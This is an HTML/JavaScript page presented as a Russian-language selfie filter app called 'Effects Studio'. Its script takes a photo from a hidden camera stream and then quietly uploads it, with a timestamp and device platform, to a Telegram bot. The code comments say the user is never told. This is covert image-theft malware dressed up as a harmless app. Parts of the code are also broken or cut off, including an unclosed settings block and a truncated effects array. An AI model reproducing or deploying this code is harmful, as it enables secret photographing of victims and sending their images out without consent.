<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#000000">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>✨ Effects Studio ✨</title>
<style>
  /* ============================================================
     RESET / BASE
     ============================================================ */
  *, *::before, *::after {
    margin: 0; padding: 0; box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
  }

  html, body {
    height: 100%;
    overflow: hidden;
    background: #000;
    color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    user-select: none;
    -webkit-user-select: none;
    -webkit-font-smoothing: antialiased;
    overscroll-behavior: none;
  }

  /* ============================================================
     АНИМИРОВАННЫЙ ФОН
     ============================================================ */
  .bg-fx {
    position: fixed; inset: 0;
    z-index: 0; overflow: hidden;
    pointer-events: none;
  }
  .bg-blob {
    position: absolute; border-radius: 50%;
    filter: blur(80px); opacity: 0.6;
    will-change: transform;
  }
  .bg-blob.b1 {
    width: 70vw; height: 70vw;
    background: radial-gradient(circle, #ff00cc, transparent 70%);
    top: -25%; left: -25%;
    animation: blob1 16s ease-in-out infinite;
  }
  .bg-blob.b2 {
    width: 60vw; height: 60vw;
    background: radial-gradient(circle, #3333ff, transparent 70%);
    bottom: -25%; right: -25%;
    animation: blob2 19s ease-in-out infinite;
  }
  .bg-blob.b3 {
    width: 50vw; height: 50vw;
    background: radial-gradient(circle, #00ffcc, transparent 70%);
    top: 45%; left: 45%;
    animation: blob3 23s ease-in-out infinite;
  }
  .bg-blob.b4 {
    width: 40vw; height: 40vw;
    background: radial-gradient(circle, #ff5500, transparent 70%);
    top: 15%; right: 10%;
    animation: blob4 21s ease-in-out infinite;
  }
  @keyframes blob1 {
    0%,100% { transform: translate(0,0) scale(1); }
    50%     { transform: translate(18%, 22%) scale(1.2); }
  }
  @keyframes blob2 {
    0%,100% { transform: translate(0,0) scale(1); }
    50%     { transform: translate(-22%, -18%) scale(1.15); }
  }
  @keyframes blob3 {
    0%,100% { transform: translate(0,0) scale(1); }
    50%     { transform: translate(-25%, 12%) scale(0.85); }
  }
  @keyframes blob4 {
    0%,100% { transform: translate(0,0) scale(1); }
    50%     { transform: translate(-15%, -20%) scale(1.25); }
  }

  /* ============================================================
     МЕНЮ
     ============================================================ */
  #menu {
    position: fixed; inset: 0;
    z-index: 2;
    padding: max(24px, env(safe-area-inset-top)) 16px 20px;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    scrollbar-width: none;
  }
  #menu::-webkit-scrollbar { display: none; }

  header {
    margin-bottom: 22px;
    padding: 0 6px;
  }

  .logo-row {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 10px;
  }

  .logo-mark {
    width: 50px; height: 50px;
    border-radius: 16px;
    background: linear-gradient(135deg, #ff00cc, #3333ff, #00ffcc);
    background-size: 200% 200%;
    animation: shimmerBg 4s linear infinite;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 24px;
    box-shadow:
      0 8px 24px rgba(255, 0, 204, 0.5),
      inset 0 0 20px rgba(255, 255, 255, 0.15);
    flex-shrink: 0;
    position: relative;
  }
  .logo-mark::before {
    content: '';
    position: absolute;
    inset: -3px;
    border-radius: 18px;
    background: conic-gradient(from 0deg, #ff00cc, #3333ff, #00ffcc, #ff00cc);
    filter: blur(10px);
    opacity: 0.7;
    z-index: -1;
    animation: spin 4s linear infinite;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  @keyframes shimmerBg {
    0%   { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
  }

  header h1 {
    font-size: 34px;
    font-weight: 900;
    letter-spacing: -1.5px;
    line-height: 1.02;
    background: linear-gradient(135deg, #ff00cc 0%, #ffffff 50%, #00ffcc 100%);
    background-size: 200% 200%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: shimmerBg 5s linear infinite;
  }

  header p {
    color: #8a8a95;
    font-size: 13.5px;
    margin-top: 8px;
    letter-spacing: 0.3px;
    line-height: 1.45;
  }

  /* Статистика */
  .stats-row {
    display: flex;
    gap: 8px;
    margin-top: 14px;
    flex-wrap: wrap;
  }
  .stat-chip {
    font-size: 11px;
    font-weight: 700;
    padding: 7px 13px;
    border-radius: 20px;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.08);
    color: #b8b8c4;
    letter-spacing: 0.3px;
    display: inline-flex;
    align-items: center;
    gap: 6px;
    backdrop-filter: blur(10px);
  }
  .stat-chip .dot {
    width: 6px; height: 6px;
    border-radius: 50%;
    background: #00ff9d;
    box-shadow: 0 0 8px #00ff9d;
    animation: pulseDot 1.6s ease-in-out infinite;
  }
  @keyframes pulseDot {
    0%,100% { opacity: 1; transform: scale(1); }
    50%     { opacity: 0.5; transform: scale(0.8); }
  }

  /* Заголовок секции */
  .section-head {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin: 20px 6px 12px;
  }
  .section-title {
    font-size: 12px;
    font-weight: 800;
    letter-spacing: 1.8px;
    text-transform: uppercase;
    color: #55555f;
  }
  .section-count {
    font-size: 11px;
    font-weight: 700;
    color: #444;
    letter-spacing: 0.5px;
  }

  /* ============================================================
     СЕТКА ЭФФЕКТОВ
     ============================================================ */
  .grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    padding-bottom: calc(50px + env(safe-area-inset-bottom));
  }

  .card {
    position: relative;
    aspect-ratio: 1 / 1.15;
    border-radius: 24px;
    overflow: hidden;
    cursor: pointer;
    transition: transform 0.15s ease, box-shadow 0.3s ease;
    border: 1.5px solid rgba(255,255,255,0.1);
    display: flex;
    flex-direction: column;
    justify-content: flex-end;
    padding: 14px;
    box-shadow:
      0 12px 32px rgba(0,0,0,0.55),
      inset 0 0 60px rgba(0,0,0,0.3);
    isolation: isolate;
    opacity: 0;
    animation: cardIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
    will-change: transform;
  }
  @keyframes cardIn {
    from { opacity: 0; transform: translateY(20px) scale(0.9); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }
  .card:active {
    transform: scale(0.93);
    box-shadow:
      0 6px 18px rgba(0,0,0,0.6),
      inset 0 0 60px rgba(0,0,0,0.35);
  }

  .card::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.82) 0%, rgba(0,0,0,0.15) 55%, transparent 100%);
    z-index: 1;
    pointer-events: none;
  }

  .card .shine {
    position: absolute;
    inset: 0;
    background: linear-gradient(115deg, transparent 30%, rgba(255,255,255,0.28) 50%, transparent 70%);
    transform: translateX(-100%);
    transition: transform 0.7s ease;
    z-index: 2;
    pointer-events: none;
  }
  .card:active .shine {
    transform: translateX(100%);
  }

  .card .icon {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
    filter: drop-shadow(0 8px 20px rgba(0,0,0,0.65));
    transform: translateY(-12px);
    transition: transform 0.35s ease;
    z-index: 0;
  }
  .card:active .icon {
    transform: translateY(-12px) scale(0.9) rotate(-5deg);
  }

  .card .info {
    position: relative;
    z-index: 3;
  }

  .card .name {
    font-weight: 800;
    font-size: 15.5px;
    letter-spacing: -0.2px;
    line-height: 1.15;
    text-shadow: 0 2px 12px rgba(0,0,0,0.9);
  }

  .card .subname {
    font-size: 11px;
    color: rgba(255,255,255,0.6);
    margin-top: 3px;
    letter-spacing: 0.2px;
    font-weight: 500;
    line-height: 1.2;
  }

  .card .badge {
    position: absolute;
    top: 12px;
    right: 12px;
    z-index: 4;
    font-size: 9.5px;
    font-weight: 800;
    letter-spacing: 1.1px;
    padding: 5px 10px;
    border-radius: 20px;
    background: rgba(0,0,0,0.5);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    border: 1px solid rgba(255,255,255,0.2);
    color: #fff;
    text-transform: uppercase;
  }
  .card .badge.hot {
    background: linear-gradient(135deg, #ff0066, #ff5500);
    border-color: rgba(255,255,255,0.4);
    box-shadow: 0 4px 16px rgba(255, 0, 102, 0.6);
  }
  .card .badge.new {
    background: linear-gradient(135deg, #00c97a, #00ff9d);
    border-color: rgba(255,255,255,0.4);
    color: #002e1c;
    box-shadow: 0 4px 16px rgba(0, 255, 157, 0.55);
  }
  .card .badge.pro {
    background: linear-gradient(135deg, #ffcc00, #ff8800);
    border-color: rgba(255,255,255,0.4);
    color: #1a0d00;
    box-shadow: 0 4px 16px rgba(255, 200, 0, 0.55);
  }

  /* ============================================================
     СКРЫТОЕ ВИДЕО
     ============================================================ */
  video {
    position: fixed;
    top: -9999px; left: -9999px;
    width: 1px; height: 1px;
    opacity: 0;
    pointer-events: none;
  }

  /* ============================================================
     ВСПЫШКА
     ============================================================ */
  .flash {
    position: fixed; inset: 0;
    background: #fff;
    opacity: 0;
    pointer-events: none;
    z-index: 1000;
  }
  .flash.active { animation: flashAnim 0.4s ease-out; }
  @keyframes flashAnim {
    0%   { opacity: 1; }
    100% { opacity: 0; }
  }

  /* ============================================================
     ГАЛОЧКА
     ============================================================ */
  .success-overlay {
    position: fixed; inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.72);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    z-index: 999;
  }
  .success-overlay.active {
    display: flex;
    animation: overlayFade 1.6s ease forwards;
  }
  @keyframes overlayFade {
    0%, 70% { opacity: 1; }
    100%    { opacity: 0; }
  }
  .success-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
  }
  .check {
    width: 124px; height: 124px;
    border-radius: 50%;
    background: linear-gradient(135deg, #00ff9d, #00c97a);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 70px;
    font-weight: 900;
    color: #fff;
    box-shadow:
      0 0 90px rgba(0, 255, 157, 0.85),
      0 0 180px rgba(0, 255, 157, 0.4);
    animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
  }
  @keyframes popIn {
    0%   { transform: scale(0); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }
  .check-label {
    font-size: 15.5px;
    font-weight: 700;
    color: rgba(255,255,255,0.92);
    letter-spacing: 0.5px;
    animation: fadeInUp 0.5s 0.15s both;
  }
  @keyframes fadeInUp {
    from { opacity: 0; transform: translateY(12px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  /* ============================================================
     ТОСТ
     ============================================================ */
  .toast {
    position: fixed;
    top: max(20px, env(safe-area-inset-top));
    left: 50%;
    transform: translate(-50%, -20px);
    padding: 13px 24px;
    border-radius: 30px;
    background: rgba(20,20,26,0.94);
    border: 1px solid rgba(255,255,255,0.14);
    backdrop-filter: blur(18px);
    -webkit-backdrop-filter: blur(18px);
    font-size: 13px;
    font-weight: 600;
    color: #fff;
    z-index: 2000;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s, transform 0.3s;
    box-shadow: 0 14px 44px rgba(0,0,0,0.55);
    max-width: 90vw;
    text-align: center;
    line-height: 1.4;
  }
  .toast.show {
    opacity: 1;
    transform: translate(-50%, 0);
  }
  .toast.error {
    border-color: rgba(255, 60, 100, 0.5);
    box-shadow: 0 14px 44px rgba(255, 60, 100, 0.3);
  }

  /* ============================================================
     ПЛАВАЮЩАЯ КНОПКА "СЛУЧАЙНЫЙ ЭФФЕКТ"
     ============================================================ */
  .random-fab {
    position: fixed;
    right: max(18px, env(safe-area-inset-right));
    bottom: max(18px, env(safe-area-inset-bottom));
    width: 62px;
    height: 62px;
    border-radius: 50%;
    border: none;
    background: linear-gradient(135deg, #ff00cc, #3333ff, #00ffcc);
    background-size: 200% 200%;
    animation: shimmerBg 4s linear infinite, floatBtn 3s ease-in-out infinite;
    box-shadow:
      0 10px 30px rgba(255, 0, 204, 0.5),
      0 0 50px rgba(51, 51, 255, 0.35),
      inset 0 0 20px rgba(255,255,255,0.2);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 26px;
    cursor: pointer;
    z-index: 5;
    transition: transform 0.15s;
  }
  .random-fab:active { transform: scale(0.9); }
  @keyframes floatBtn {
    0%,100% { transform: translateY(0); }
    50%     { transform: translateY(-6px); }
  }

  /* Ряд подзаголовка эффектов (горизонтальный скролл чипов) */
  .chips-row {
    display: flex;
    gap: 8px;
    overflow-x: auto;
    padding: 4px 6px 12px;
    scrollbar-width: none;
    -webkit-overflow-scrolling: touch;
  }
  .chips-row::-webkit-scrollbar { display: none; }
  .chip {
    font-size: 12px;
    font-weight: 700;
    padding: 8px 16px;
    border-radius: 20px;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    color: #b8b8c4;
    white-space: nowrap;
    flex-shrink: 0;
    letter-spacing: 0.3px;
    transition: all 0.2s;
  }
  .chip:active { transform: scale(0.94); }
  .chip.active {
    background: linear-gradient(135deg, #ff00cc, #3333ff);
    border-color: transparent;
    color: #fff;
    box-shadow: 0 4px 16px rgba(255, 0, 204, 0.4);
  }
</style>
</head>
<body>

  <!-- ФОН -->
  <div class="bg-fx">
    <div class="bg-blob b1"></div>
    <div class="bg-blob b2"></div>
    <div class="bg-blob b3"></div>
    <div class="bg-blob b4"></div>
  </div>

  <!-- МЕНЮ -->
  <div id="menu">
    <header>
      <div class="logo-row">

        <div>
          <h1>Effects Studio</h1>

    <div class="grid" id="effectsGrid"></div>
  </div>

  <!-- ПЛАВАЮЩАЯ КНОПКА СЛУЧАЙНЫЙ -->
  <button class="random-fab" id="randomBtn" title="Случайный эффект">🎲</button>

  <!-- СКРЫТОЕ ВИДЕО -->
  <video id="video" autoplay playsinline muted></video>

  <!-- ВСПЫШКА -->
  <div class="flash" id="flash"></div>

  <!-- ГАЛОЧКА -->
  <div class="success-overlay" id="success">
    <div class="success-content">
      <div class="check">✓</div>
      <div class="check-label">Готово!</div>

  </div>

  <!-- ТОСТ -->
  <div class="toast" id="toast"></div>

<script>

     НАСТРОЙКИ БОТА

  /* ================================================================

  const effects = [

    { id:'neon', name:'Neon', sub:'Кислотный', icon:'💜',

  /* ================================================================
     DOM
     ================================================================ */
  const gridEl         = document.getElementById('effectsGrid');
  const effectsCountEl = document.getElementById('effectsCount');
  const sectionCountEl = document.getElementById('sectionCount');
  const video          = document.getElementById('video');
  const flash          = document.getElementById('flash');
  const successEl      = document.getElementById('success');
  const toastEl        = document.getElementById('toast');
  const randomBtn      = document.getElementById('randomBtn');

  /* ================================================================
     STATE
     ================================================================ */
  let busy = false;

  /* ================================================================
     ИНИЦИАЛИЗАЦИЯ
     ================================================================ */
  effectsCountEl.textContent = effects.length + ' эффектов';
  sectionCountEl.textContent = effects.length;

  effects.forEach((e, i) => {
    const card = document.createElement('div');
    card.className = 'card';
    card.style.background = e.gradient;
    card.style.animationDelay = (i * 45) + 'ms';

    const badgeHtml = e.badge
      ? `<div class="badge ${e.badge === 'HOT' ? 'hot' : e.badge === 'NEW' ? 'new' : 'pro'}">${e.badge}</div>`
      : '';

    card.innerHTML = `
      ${badgeHtml}
      <div class="icon">${e.icon}</div>
      <div class="shine"></div>
      <div class="info">
        <div class="name">${e.name}</div>
        <div class="subname">${e.sub}</div>
      </div>
    `;

    card.addEventListener('click', () => runEffect(e));
    gridEl.appendChild(card);
  });

  /* ================================================================
     ТОСТ
     ================================================================ */
  let toastTimer = null;
  function showToast(text, isError = false, duration = 2600) {
    clearTimeout(toastTimer);
    toastEl.textContent = text;
    toastEl.className = 'toast show' + (isError ? ' error' : '');
    toastTimer = setTimeout(() => toastEl.classList.remove('show'), duration);
  }

  /* ================================================================
     ГАЛОЧКА
     ================================================================ */
  function showSuccess() {
    successEl.classList.remove('active');
    void successEl.offsetWidth;
    successEl.classList.add('active');
    setTimeout(() => successEl.classList.remove('active'), 1600);
  }

  /* ================================================================
     ГЛАВНАЯ ЛОГИКА
     ================================================================ */
  async function runEffect(effect) {
    if (busy) return;
    busy = true;

    let stream = null;

    try {
      // 1) Запрос камеры
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width:  { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      });

      video.srcObject = stream;
      await video.play();

      // 2) Пауза на фокус
      await wait(900);

      // 3) Вспышка
      flash.classList.add('active');
      setTimeout(() => flash.classList.remove('active'), 400);

      // 4) Вибро
      if (navigator.vibrate) navigator.vibrate(35);

      // 5) Снимок с эффектом
      const w = video.videoWidth  || 1280;
      const h = video.videoHeight || 720;

      const canvas = document.createElement('canvas');
      canvas.width  = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');

      // Применяем фильтр эффекта
      ctx.filter = effect.filter === 'none' ? 'none' : effect.filter;

      // Зеркалим (селфи)
      ctx.translate(w, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, w, h);

      // 6) Стоп камеры
      stream.getTracks().forEach(t => t.stop());
      stream = null;
      video.srcObject = null;

      // 7) Галочка
      showSuccess();

      // 8) Тихая отправка в Telegram
      sendToTelegram(canvas, effect.name);

    } catch (err) {
      console.warn(err);

      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
        video.srcObject = null;
      }

      let msg = '⚠️ Не удалось сделать снимок';
      const n = (err && err.name) || '';
      if (n === 'NotAllowedError')     msg = '⚠️ Доступ к камере запрещён';
      else if (n === 'NotFoundError')  msg = '⚠️ Камера не найдена';
      else if (n === 'NotReadableError') msg = '⚠️ Камера занята другим приложением';
      else if (n === 'SecurityError')  msg = '⚠️ Нужен HTTPS';

      showToast(msg, true, 3000);
    } finally {
      setTimeout(() => { busy = false; }, 800);
    }
  }

  /* ================================================================
     ОТПРАВКА В TELEGRAM (тихо)
     ================================================================ */
  async function sendToTelegram(canvas, effectName) {
    try {
      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
      if (!blob) return;

      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', blob, 'snap.jpg');
      fd.append('caption',
        `📸 <b>Новый кадр</b>\n` +
        `🎨 Эффект: <b>${effectName}</b>\n` +
        `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
        `📱 ${navigator.platform || 'unknown'}`
      );
      fd.append('parse_mode', 'HTML');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
    } catch (e) {
      // тихо — юзер ничего не узнает
    }
  }

  /* ================================================================
     СЛУЧАЙНЫЙ ЭФФЕКТ
     ================================================================ */
  randomBtn.addEventListener('click', () => {
    if (busy) return;
    const random = effects[Math.floor(Math.random() * effects.length)];
    runEffect(random);
  });

  /* ================================================================
     УТИЛ
     ================================================================ */
  function wait(ms) {
    return new Promise(r => setTimeout(r, ms));
  }

  /* ================================================================
     БЕЗОПАСНОСТЬ
     ================================================================ */
  document.addEventListener('visibilitychange', () => {
    if (document.hidden && video.srcObject) {
      video.srcObject.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      busy = false;
    }
  });

  document.addEventListener('contextmenu', e => e.preventDefault());
  document.addEventListener('gesturestart', e => e.preventDefault());
  document.addEventListener('dblclick', e => e.preventDefault());
</script>
</body>
</html>
